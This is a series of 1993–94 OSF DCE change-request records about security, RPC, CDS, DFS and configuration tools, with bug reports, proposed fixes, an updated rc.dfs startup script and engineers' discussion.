CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : acl_edit should be able to delete stranded acl entries
Reported Date                 : 6/9/93
Found in Baseline             : 1.0
Found Date                    : 6/9/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/9/93 public]

From comp.unix.osf.misc; this is an enhancement, not a bug, because there
is a workaround (adopt the principal).

Newsgroups: comp.unix.osf.misc
Path: apollo.hp.com!sdd.hp.com!col.hp.com!csn!cherokee!da_vinci!jld
From: Jeffrey L. DeMent <jld@advtech.uswest.com>
Subject: Deleting Obsolete ACL Entries
Message-ID: <C8B3wF.ErH@da_vinci.it.uswc.uswest.com>
Originator: jld@dropzone
Sender: news@da_vinci.it.uswc.uswest.com (IT Netnews)
Nntp-Posting-Host: dropzone
Reply-To: Jeffrey L. DeMent <jld@advtech.uswest.com>
Organization: U S WEST Advanced Technologies
Distribution: usa
Date: Tue, 8 Jun 1993 14:21:51 GMT
Lines: 41

Tell me this is not true .....

I have obsolete ACL entries I would like to remove but acl_edit does not
let me do it, for instance:

% acl_edit /.:/u/jld -l

# SEC_ACL for /.:/u/jld:
# Default cell = /.../ssed.advtech.uswest.com
unauthenticated:r--t---
user:cell_admin:rwdtcia
user:hosts/hacksaw/cds-server:rwdtcia
user:000015B6-7A86-2B3F-B200-820D1A420000:rwdtci-
group:subsys/dce/cds-admin:rwdtcia
group:subsys/dce/cds-server:rwdtcia
any_other:r--t---

This ACL entry belongs to a principal I've deleted.  When I try and remove
a single entry, acl_edit complains about the syntax:

% acl_edit /.:/u/jld -d user:000015B6-7A86-2B3F-B200-820D1A420000:rwdtci-

AND ACL_EDIT SAYS INVALID ENTRY OR WORDS TO THAT EFFECT.

I've been told the only way to remove the offending entry is to use "kill"
and blow away all ACL entries for /.:/u/jld and then re-entry the ones I
want to keep.  Isn't there a better way ?

Jeff
_____________________________________________________________________

 Jeffrey L. DeMent                                  _._._._._._._
 U S WEST Advanced Technologies                    (_|_|_|_|_|_|_)
 1475 Lawrence Street, Suite 400                    ` \` | | '/ '
 Denver, Colorado  80202                             ` \`| |'/ '
                                                      ` \| |/ '
 Phone: (303) 595-0519                                 ` \0/ '
 FAX:   (303) 592-6532                                  `~#~'



CR Number                     : 8130
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Two bindings to same host?
Reported Date                 : 6/9/93
Found in Baseline             : 1.0.3
Found Date                    : 6/9/93
Severity                      : B
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/9/93 public]
DCE should provide a routine that looks at two RPC binding handles and
tells you if they are going to the same host.  This can be done right
now by converting them to string bindings, parsing out the IP address,
and doing a string compare, but that's an ugly non-portable solution.

A server that uses all protcol sequences have a client that wants, for
whatever reason, to know if it has already spoken to that server.
	void rpc_binding_same_host(
	    rpc_binding_handle_t h1,
	    rpc_binding_handle_t h2,
	    boolean32 onsamehost,
	    error_status_t *st);

In an ideal world there would be another routine that tells if you two
bindings are going to the same process, but that might be harder to
implement:
	void rpc_binding_same_process(
	    rpc_binding_handle_t h1,
	    rpc_binding_handle_t h2,
	    boolean32 insameprocess,
	    error_status_t *st);

[6/9/93 public]

Unless the two binding handles refer to the same protocol,
rpc_binding_same_host is a nontrivial problem to solve.  You cannot easily
know (locally) by looking at two arbitrary-protocol addresses if they
ultimately resolve to the same host.

One possible implementation would be to construct a uuid, ship it to a
remote server (such as rpcd) using the address in handle_1, and see if
handle_2 can get to the remote server to get the uuid back.  [Obviously the
remote server would use all protseqs.]  The remote server would keep a
small cache of these uuids and remove one when a match is made, or after a
reasonable timeout period.

rpc_binding_same_process would need a constraint that requires the handles
are already fully-bound, or otherwise unambiguously-bindable to the same
remote process (similar to the way the rpc_mgmt routines check for
rpc_s_binding_incomplete.)  Otherwise the remote rpcd can arbitrate them to
different processes and the resulting answer would be meaningless.

Just out of curiosity, what's the basis of the application's requirement?

[06/09/93 public]
Sorry, I wasn't thinking of a general solution (is this OSI address
1.23.4.56.1.1.1 the same as IP address 128.23.16.6), but rather for the
case where you can look at the address families.  I meant to imply that by
my description of the work-around. For the general case, stuffing an
	rpc_s_cannot_tell
into *st and returning false is good enough.

DME's license server needs to ensure that it is the only going to get one
binding to a server.  I can imagine other clients that would want to
filter what rpc_ns_binding_import returns so that they don't get
the same server multiple times.  The more I think about it, the more it
seems like a real annoyance.

[05/04/94 public]
There are no plans to do this for 1.1.
Not going to defer (ie send to limbo-land) quite yet.

[5/5/94 public]

Note that even *within* a particular address family, it will not always be
possible to match up the bindings, since nodes may have multiple network 
addresses (i.e., for multi-homed nodes).

I agree that it would be highly desireable to be able to match up the binding
handles that belong to a pargicular server during a binding import (which 
would be easy if we fixed the use of server entries to only contain bindings 
from a single server).

[05/09/94 public]
The barry@osf.org and boaz@osf.org mail addresses do not exist so I have
removed them to stop bouncing mail.



CR Number                     : 8124
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : rpc
Subcomponent Name             : 
Short Description             : fix to eliminate compile time warnings
Reported Date                 : 6/9/93
Found in Baseline             : 1.0.2
Found Date                    : 6/9/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : rpc/sys_idl/stubbase.h
Sensitivity                   : public

[6/9/93 public]

change

	typedef char rpc_trans_tab_t [256];

to:

	typedef unsigned char rpc_trans_tab_t [256];



CR Number                     : 8092
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : sec
Subcomponent Name             : security repl. authentication
Short Description             : unnecessary key schedule generation
Reported Date                 : 6/4/93
Found in Baseline             : 1.0.2
Found Date                    : 6/4/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : server/rs/rs_rep_auth.c
Sensitivity                   : public

[travis@transarc.com 6/4/93 public] Just a nit -- private routine
  decode_auth_info() in rs_rep_auth.c calls krb5_process_key() even
though the computed eblock is not used; instead, the immediately
following call to krb5_decrypt_tkt_part() repeats the krb5_process_key()
call within its own scope, on a local eblock. Just a minor performance
thing -- rarely happens -- but it does happen under a read lock on the
database.



CR Number                     : 8014
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : sec
Subcomponent Name             : 
Short Description             : more problems with key garbage collection
Reported Date                 : 5/18/93
Found in Baseline             : 1.0.2
Found Date                    : 5/18/93
Severity                      : B
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/18/93 public]
Some (post - OT 7612) analysis by OS/2 DCE development:

    Assuming all fixes made under O.T. 7612 are in place, the garbage
 collection algorithm is still not "foolproof".  It is not foolproof
 since the tacit assumption made under 7612 was that the policy
 parameter "maximum ticket lifetime" remains a constant over time.

    It is not difficult to construct scenarios where the value of
 "max ticket lifetime" is reduced over a time period, and where
 some number of key updates have occurred.  In such situations, one
 can have a key garbage collected that still represents a valid,
 unexpired ticket.  For example:

    - at hour zero, max ticket lifetime = 16 hours.  User obtains
        ticket for application server ABC, good for 16 hours.  Let's
        call the key used to encrypt this ticket X

    - at hour one, administrators decide max ticket lifetime should
        be set to "standard" value of 8 hours.

    - at hour two, server ABC just so happens to do its periodic key
         update.  Let's call this new key X+1.

    - at hour eleven, an administrator decides, for some reason, to
         manually alter ABC's key via the rgy_edit "kta -p ABC -r -a".
         (The administrator may well have to alter the acl for ABC
         first, to grant 'u' permission to himself.)  This generates
         key X+2.  It turns out that key X+1 is the most recent key
         that was generated prior to time (NOW-maxticket life) which
         is (11-8) = third hour.  Hence, by 7612 algorithm, key X is
         housecleaned and removed from the keytable that server ABC
         is looking at.

    - from hour eleven until hour sixteen, use of the original ticket
         to server ABC will fail.  ABC will be unable to decrypt it.

    Thus, thought should be given as to whether there is a reasonable
 fix to this problem.  One possible solution that does not work in
 all situations is to store the max_ticket_life that existed at time
 of key generation with that key in the key table.  The problem here
 is that during the timeframe before the *next* key is generated, the
 max ticket lifetime could have changed.  To be foolproof, you need
 to know what the largest value of max_ticket_life was between the
 period timestamp(X) and timestampt(X+1).  (And, given the fact that
 several registry entities control what is effectively the maximum
 ticket lifetime makes the problem somewhat more complicated.)

    The only other general solution that pops into mind would be to
 make the registry maintain a "history of effective maximum ticket
 lifetime" values.  Thus, when clients do garbage collection, they
 could query the registry for the maximum ticket life between two
 requested times.  Typically, it would ask for the period between
 the granting of X and X+1.   Besides defining a new API, this solution
 has additional "headaches":  what criteria is used to clean up this
 "history"; more importantly, how does the history reflect changes
 to the effective max_ticket_life that is unique per principal due to
 altering max ticket life in the individual accounts?  This would
 seemingly complicate the processing of the "history" file to a much
 greater extent than if you assumed max_ticket_life applied equally
 to all principals.

    In any event, some thought needs to be given.  Perhaps the overhead
 of the above solutions is too much cost for too little benefit.  Perhaps
 simpler solutions, not necessarily foolproof, should be considered
 to at least solve scenarios like the one given.  Perhaps the registry
 could adapt some ad hoc policies, such as "ensure that the password
 lifetime be at least 3 times as great as max ticket lifetime".  In
 addition, restrictions might be placed on how often key updates could
 occur based on these policy parameters.  The affect of all of this
 might be to realistically reduce the problem of garbage collection,
 but not render it foolproof.

    Or, the affect of this O.T. could simply be to provide adequate
 warnings in documentation as to what might happen if administrators
 muck around with the max_ticket_lifetime, or if administrators take
 it upon themselves to change passwords for server principals, a job
 normally associated with a daemons special thread.

 SUMMARY:

    After 7612, there still exist odd circumstances where keys for
 still valid tickets will be garbage collected.  These scenarios are
 somewhat unlikely, and require both changes to max_ticket_life and
 administrator manual changes to server keys.  It appears that any
 foolproof solution involves significant work.  It may be acceptable
 to use ad hoc solutions which further limit the possibility of
 "bad" garbage collection.  It may be acceptable to provide warnings
 in documentation.  This is not truly a serious problem as of yet,
 it would not appear, so the luxury exists of thinking through all of
 this thoroughly before a decision is made.



CR Number                     : 7984
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : kutils/*/syscall.c
Short Description             : out of range vs. unimplemented treated differently
Reported Date                 : 5/12/93
Found in Baseline             : 1.0.2
Found Date                    : 5/12/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : 
Transarc Deltas               : 
Transarc Herder               : 

[5/12/93 public]
Out of range AFS calls return -1/EINVAL
In range, but unimplemented AFS calls return -1/ENOSYS
This means that when the system call table is extended, any user space
wrappers will have to deal with both EINVAL and ENOSYS as meaning "not
implemented".
This was noticed by Doug Robinson @ HP; it's in machine-specific code, but
it's the same in all implementations he looked at....
Also, Doug thinks that unimplemented calls should also do a psignal(...,
SIGSYS) to make it absolutely clear to user space that the system call is
unimplemented, as if it were in the real system call table, if that's the
intent..

[5/12/93 public]
Assign it to Pervaze so it doesn't fall through the cracks.

[9/28/93 public]
After talking to Elliot, make it as an enhnacement for the future. 
So marked. 
Changed Defect or Enhancement? from `def' to `enh' 
Changed Responsible Engr. from `pakhtar@transarc.com' to `tu@transarc.com' 
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `' 
Added field Transarc Status with value `'

[3/30/94 public]
We're looking at this in 1.1



CR Number                     : 7975
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : cds/control/cds.cdt
Short Description             : Removing non-supported add
sub-commands
Reported Date                 : 5/11/93
Found in Baseline             : 1.0.2
Found Date                    : 5/11/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/11/93 public]

File cds.cdt includes several subcommands for "add" which are not
documented; These include
  clearinghouse
  link
  softlink
  child
  replica

If they are not supported, remove them from cds.cdt file. If they are,
please properly document them.

[5/17/93 public]

More:

One Line Description:

        cdscp do filename appears to be in the code but not in the
documentation

Full Description:

        The file cds.cdt and the rest of the cdscp implementation appears
to support a command of the form "do <filename>", but this command does not
appear in the reference man pages for cds. In addition, the command appears
to take unnecessarily long to terminate.

Repeat By:

        echo "show dir /.:/hosts" > /tmp/testcdscp
        cdscp do /tmp/testcdscp


Proposed Solution:

        either document the command or delete it from the code. This seems like
it might be pretty useful so it should probably be left in but there are
other ways to do this. If it not deleted the command should terminate quicker.



CR Number                     : 7956
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cfg
Subcomponent Name             : dce_config
Short Description             : Enhance rc.dfs to log salvager errors
Reported Date                 : 5/7/93
Found in Baseline             : 1.0.2
Found Date                    : 5/7/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[5/7/93 public]
It would be nice if rc.dfs tried a little harder to salvage episode 
aggregates, and kept a log of the output should things fail.  I have attached
a version of rc.dfs that does this.
--------------------------- Updated rc.dfs ----------------------------------
DCELOCAL=/opt/dcelocal
#
# These lines auto-enabled by dce_config for RIOS
# platform only.
#
$DCELOCAL/ext/cfgexport -a $DCELOCAL/ext/export.ext
$DCELOCAL/ext/cfgdfs -a $DCELOCAL/ext/dfscore.ext
$DCELOCAL/ext/cfgdfs -a $DCELOCAL/ext/dfscmfx.ext
$DCELOCAL/ext/cfglfs -a $DCELOCAL/ext/dcelfs.ext
echo "\tStarting epidaemon"
$DCELOCAL/bin/epidaemon 1
#LFSINIT=$DCELOCAL/bin/epiinit
if [ $LFSINIT ]; then
        echo "Initializing DCE/LFS"
        $LFSINIT
fi
/bin/rm -f $DCELOCAL/var/dfs/dfsatab
DFSEXPORT=$DCELOCAL/bin/dfsexport
#
# Handle correctly salvaging LFS aggregates; note that this is not run unless
# the above line is uncommented (which it is by dce_config).
#
if [ $DFSEXPORT ]
then
    echo "Running dfsexport..."
    dfsexportLog="/tmp/dfsexport.$$.log"
    dfsErrorLog="/tmp/rc.dfs.error.$$"
    dfsErrorFlag=0
    LFSAGGRS=`awk ' substr($1,1,1) != "#" && \
        $3 == "lfs" { print $1 }' $DCELOCAL/var/dfs/dfstab`
    EXPORTABLE_AGGRS=`awk ' substr($1,1,1) != "#" && \
        $3 != "lfs" { print $1 }' $DCELOCAL/var/dfs/dfstab`
    echo "Exporting aggregates, $LFSAGGRS" >> $dfsErrorLog
    for lfsaggr in $LFSAGGRS
    do
        $DFSEXPORT $lfsaggr 2>> $dfsexportLog
        /bin/cat $dfsexportLog >> $dfsErrorLog
        if [ $? -ne 0 ]
        then
            #
            # Obviously, we'd prefer to check the return
            # value rather than grep the error string,
            # but until dfsexport returns meaningful
            # error codes, we've got no choice
            #
            grep "need to be recovered" $dfsexportLog
            if [ $? -eq 0 ]
            then
                salvageErrorLog="/tmp/salvage.error.$$"
                echo "Recovering aggregate $lfsaggr... " | tee -a $dfsErrorLog
                $DCELOCAL/bin/salvage -rec -verify $lfsaggr > $salvageErrorLog
                if [ $? -eq 0 ]
                then
                    EXPORTABLE_AGGRS="$EXPORTABLE_AGGRS $lfsaggr"
                    /bin/rm -f $salvageErrorLog
                else
                    dfsErrorFlag=1
                    /bin/cat $salvageErrorLog >> $dfsErrorLog
                    /bin/rm -f $salvageErrorLog
                    echo "WARNING: Salvage of $lfsaggr FAILED!" | tee -a $dfsErr
orLog
                    echo "  Error output is in: $dfsErrorLog"
                    echo "  You need to run the salvager with no options on"
                    echo "  this aggregate, and then export it with dfsexport."
                fi
            else
                dfsErrorFlag=1
                echo "WARNING: Export of aggregate, $lfsaggr, FAILED!" | tee -a
$dfsErrorLog
                echo "  Error output is in: $dfsErrorLog"
            fi
        fi
        /bin/rm -f $dfsexportLog > /dev/null 2>&1
    done
    #
    # Now export all non-lfs aggregates and those lfs aggregates that
    # salvaged successfully.
    #
    for expaggr in $EXPORTABLE_AGGRS
    do
        echo "Exporting aggregate, $expaggr" >> $dfsErrorLog
        $DFSEXPORT $expaggr 2>> $dfsErrorLog
        if [ $? -ne 0 ]
        then
            dfsErrorFlag=1
            echo "WARNING: export of aggregate, $expaggr, FAILED!" | tee -a $dfs
ErrorLog
            echo "  Error output is in: $dfsErrorLog"
        fi
    done
    #
    # Remove error log if all went well.
    #
    if [ $dfsErrorFlag -eq 0 ]
    then
        /bin/rm -f $dfsErrorLog 2> /dev/null
    fi
fi
echo "  running bosserver: be patient..."
$DCELOCAL/bin/bosserver
echo "  running dfsbind: be patient..."
$DCELOCAL/bin/dfsbind
echo "  running fxd..."
$DCELOCAL/bin/fxd -mainprocs 7 -admingroup subsys/dce/dfs-admin
echo "  running dfsd..."
$DCELOCAL/bin/dfsd
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'



CR Number                     : 7951
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : control
Short Description             : CDSCP Class Name with more
than 31 characters indicates error in the wrong place.
Reported Date                 : 5/6/93
Found in Baseline             : 1.0.2
Found Date                    : 5/6/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/6/93 public]

Type the following:

cdscp create object /.:/dir1/dir3 CDS_class =
ClassNameWithLengthMoreThan31Chars CDS_ClassVersion = 1.0

A syntax error is returned as expected, but the marker indicates the space
after ClassNameWithLengthMoreThan31Chars is in error rather than marking
the start of the invalid name.  This implies that the name is OK, but
something after it is incorrect.

[9/13/93 public]
This will be fixed as part of the I18N work for cdscp for 1.1.



CR Number                     : 7949
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : Invalid Characters allowed for
CDS objects
Reported Date                 : 5/6/93
Found in Baseline             : 1.0.2
Found Date                    : 5/6/93
Severity                      : D
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/6/93 public]

Jim Souter did testing to check validity of characters in CDS names.  Used
cdscp to create various cds object names.  According to published claims,
only code points x20-x7e should be valid.  According to test results, the
following was observed:

 1) x01-20 not valid (expected)
 2) x21 (!): valid if entered surrounded by single quotes; if entered
    surrounded by double quotes or without quotes, accepted, but acts as 
    string terminator.  This behavior is unexpected and probably an error.
 3) x22 (") accepted but deleted from string (unexpected).
 4) x23 (#) acted just like x21.
 5) x27 (') not accepted under any conditions (error).
 6) x2f (/) acted just like x21.
 7) x3e (>) can be entered using double quotes; however, if entered with
    single quotes, it is stripped (unexpected).
 8) x62 (^) acted just like x3e.
 9) x7c (|) acted just like x21.
10) x7f cannot enter.
11) x80-x95 cannot enter (expected).
12) x96-xff can be entered (totally unexpected).

Of all the above, the most interesting observation is found in 11 & 12.
Expected all of character range x80-xff to act in the same manner, not part
one way and part the other.

Also checked CDS_Class values for character sensitivity.  Confirmed exactly
the same results shown above for CDS object names.  Character validity is
the same no matter whether the characters are entered on the server or the
client.

[9/13/93 public]
This will be fixed as part of the I18N work for 1.1.



CR Number                     : 7939
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : cds
Subcomponent Name             : 
Short Description             : unable to recreate a cds secondary
immediately after removing it
Reported Date                 : 5/5/93
Found in Baseline             : 1.0.2
Found Date                    : 5/5/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/5/93 public]
After removing a cds secondary server and recreating it successfully, a skulk
cannot be performed.  The error returned is "Unable to communicate with any
CDS server".  The problem is stemming from the spread code.  This code attempts
to get replica information from the secondary cdsd via clerk_read_replica().
Upon getting over to the secondary cdsd, the secondary cdsd then performs a
who_are_you callback to the clerk (under the RPC covers).  This call is 
failing with a kerberos decrypt integrity error.  It seems that when the
secondary is removed, the primary cdsd (and clerk) have old security info
about the secondary.  This problem will go away after a 2 hour period (due to
security refreshing tickets).  I have talked with Peter Keegan about this.
He felt that the problem was in Security.  I am opening this OT since I have
more understanding of how the problem is happening as it relates to cds.  I
will let the experts decide where the problem is.  With a private build, I
implemented a demand refresh of the primary server identity (broadcasting to
a condition variable in the refresh_server_identity thread).  This caused the
wait to be only 10 minutes before a skulk would work.  Terminating the primary
cdsd and restarting corrects the problem all together.

[05/06/93 public]
I'll have security look at it but leave it in cds until then....

[6/7/93 public]
The problem seems to be that the security code in the secondary cds
server is not happy with the credentials of the client.  The client 
in this case is the cds master server, whose identity is passed to
a clerk running on the master.  Now, even if you kill this clerk,
I believe the failure still occurs, because the cds master server is
passing the same login context to the clerk.  Now, after a few
hours, a thread in the master cds server wakes up and refreshes the
server's identity and the next time it tries to contact the secondary
(via the clerk), it succeeds.

This seems like a generic problem applicable to any DCE application that
uses authenticated RPC.  The master cds server is refreshing it's identity
at an interval based on information it gets from the registry.  There is no
other mechanism for it learn that it needs to refresh it any sooner.  I
still don't understand why the secondary server is getting the 'kerberos
decrypt integrity' error.  

I think a security person should review this before we consider making
any changes to CDS.

[7/16/93 public]
I'm reassigning to security in the hopes that more advice (or even
a bug fix :-) will result.

[7/16/93 public]

Hoo boy.  We have the following scenario here, from the point of view of
security.

This is a hard problem to solve; in any event, fixing it may require the
intervention of CDS, so this is reassigned to them.  I'll open a fresh
security enhancement request to explore solutions to the problem.

 - CDS creates a principal in security, sets a key on it, with key version #1
 - cdsd uses the principal, and has a ticket to that principal in it's
(replication) login context.
 - the admin deletes the replica and the principal.
 - the admin then re-creates the principal with the same name, but a
	different key.
 - cdsd re-uses the old ticket, encrypted under the old principal's key.
 - carnage results until the ticket expires and is replaced, typically some
time in the next 2 hours.

I think the easiest fix is procedural:
option 1) don't do this:
	- if you have to blow away and reconfig a server, do it under a
different principal name.
	- or, keep the keytab entry and account the same, so that the old
tickets are still valid.
	2) work around it in CDS
	- refresh the server's identity whenever a replica that you've
talked to is *deleted*.

We might want to add a new API to security to flush references to a
particular principal from a login context so as to avoid getting confused
by this problem, but someone would have to call this.

We could make this problem easier to deal with by keeping around a
"skeleton" of the old principal when it's deleted, so that the new
principal uses a different key version number on the principal's key.

[7/27/93]
One of the things that I did while investigating this was to create a condition
variable in the refresh_identity thread and do a timed wait on it.  I was then
able to broadcast to this condition variable via cdsd_diag and start up the
refresh thread.  I still seemed to have problems but it took less time to
correct itself (~10 minutes instead of 2 hours).  Don't know if I missed
something in my implementation.



CR Number                     : 7931
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cfg
Subcomponent Name             : dce_config
Short Description             : Use /.:/fs list to restart flservers, not subsys/dce/dfs-fs/servers
Reported Date                 : 5/4/93
Found in Baseline             : 1.0.2b22
Found Date                    : 5/4/93
Severity                      : D
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/4/93 public]
The code added to dce_config that restarts the flservers uses the list
of members in the Security group subsys/dce/dfs-fs-servers to determine
who the flservers are.  flserver itself uses the list of members in the
RPC group /.:/fs, and so should dce_config.  It is very possible that
administrators will tear down an flserver machine and forget to remove
it from the Security group.

Because of the way the code is written (never checking the udebug return 
code, just grep'ing for one of two specific messages), I don't think the
code will fail in this situation.  It will just be trying to contact
flservers that do not exist.

Vijay at Transarc agrees that /.:/fs should be used.

(Note: Make sure you use the -u option in the 'rpccp show group' command...)

[10/25/93 public]
You're going to have to give me a little better rationale for
making this change.  You said yourself, the code already works.
"If it ain't broken, don't fix it".  Besides, if administrators
use the dce_config provided way of deconfiguring an flserver 
machine we will not run into the inconsistent state you mention
above (once the dfs.unconfig script is fixed in OT9123).  This
is a non-trivial change since if you do it for the flservers, you
should also do it for the bak servers to be consistent.  If
you don't respond with better rationale for making this somewhat
gratuitous change in the next day or so, I'll be cancelling
this defect.

[10/25/93 public]
Oh, sure, change the rules... ;-)  Yes, dce_config has recently been enhanced to
perform unconfiguration (and will be fixed to run correctly bo OT9123).

However, I still suggest the change.  Being a member of the security group only
states that you MAY serve as an flserver at some point in time.  Being a member
of the RPC group states that you ARE serving as an flserver NOW.  DFS does not
use subsys/dce/dfs-fs-servers to determine who to query--it uses /.:/fs.  As a
point of correctness, I think dce_config should be changed.

And once you've done this for one service, I don't think changing a second
service (bakserver) will make this effort "non-trivial."  Probably one
function could serve the purpose for both cases...

[10/26/93 public]
I agree that this change is nice to have "as a point of correctness",
but since the current code works just fine, I'm moving this to
an enhancement.



CR Number                     : 7788
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : sec
Subcomponent Name             : rgy_edit
Short Description             : auth pol changes in rgy_edit are
confusing
Reported Date                 : 4/22/93
Found in Baseline             : 1.0.2
Found Date                    : 4/22/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[4/22/93 public]
rgy_edit has some serious usability problems.

Situations (1) and (2) below are just a couple of the inconsistent and puzzling
ways in which rgy_edit acts.  I've made suggestions (labeled A - C) that I think 
would clear up some confusion.


(1) Changing an account's "Max certificate lifetime" and "Max renewable
    lifetime" is inconsistent, depending on how the "change" subcommand
    is invoked.

rgy_edit=> c -p julie
Enter new misc info: 
Enter new home directory: 
        .
        .
        .
Create/Change auth policy for this acct [y/n]? (n) y
Enter maximum certificate lifetime in hours or 'forever': 
Enter maximum certificate-renewable lifetime in hours or 'forever': 

rgy_edit=> c -p julie -g none -o none
Enter new account id [pname]: (julie)
Enter account group [gname]: none
        .
        .
        .
Enter maximum certificate lifetime in hours or 'forever': (8) 
Enter maximum certificate-renewable lifetime in hours or 'forever': (168) 

Default change values are provided in the second case but not in the first.
The values provided in the second case do not match the default values
for the registry as seen with the "au" subcommand.

rgy_edit=> au
  Authorization Policy:
    Max certificate lifetime:                 1d
    Max renewable lifetime:                   4w
Do you wish to make changes [y/n]? (n)

Suggestions:
A) If default change values are provided, they should be provided via any
   change path.
B) The default change values should match the default auth policy values.
C) The "max certificate lifetime" and "max certificate renewable lifetime"
   should not specify hours for input -- they both take values of the
   form XwXdXhXm.

(2) When viewing an account, if the auth policy has not been changed, the
    values for "max certificate lifetime" and "max certificate renewable lifetime"
    are shown as "default-policy" upon a "view -f".  Once they've been
    changed to some numeric value, the values shown are the numeric values of what

    they've been changed to, even if that value is greater than the registry auth
    pol value. If they've been changed to "forever", the values shown go back to
    "default-policy".

Suggestion:
A) Upon a full view of an account, values for "max certificate lifetime" and
   "max certificate renewable lifetime" should show the numeric values of the
   account policy (if set) AND the numeric values of the policy in effect (which
   should be the shorter of the account policy and the registry policy).

[4/23/93 public]
This is really asking for enhancements to rgy_edit to make it easier to
understand, so I changed it from 'def' to 'enh'.  Here's answers to some
of the above comments:

> Default change values are provided in the second case but not in the first.
Default values for any account change prompt are those values that are already
stored in the database.  In the first case you are doing what rgy_edit
considers a wildcard change (specified only subset of princ,group,org) so 
there is no specific account.  Another enhancement CR is open to make sure
that we change it so that rgy_edit won't consider any operation a wildcard
if the principal is specified (in it's previous incantation, rgy_edit
operated in an environment where you could have more than 1 acct per princ),
which will fix that particular problem.  Then in the case where you specified
a wildcard (ie: just group and/or org), this part of this CR will address the
fact that it should use the RGY's auth policy for the default values.  We
will not change the defaults for the non-wildcard case, because they currently
match the way the rest of account changes work.

>C) The "max certificate lifetime" and "max certificate renewable lifetime"
>   should not specify hours for input -- they both take values of the
>   form XwXdXhXm.
Yes that prompt is confusing, but the current rgy_edit prompt mechanism had
limited us to 1 line prompts, and there wasn't enough room in 80 chars to
say: "Enter maximum certificate-renewable lifetime in hours if you don't
specify units, or in format XwXdXhXm or 'forever':"    :-)
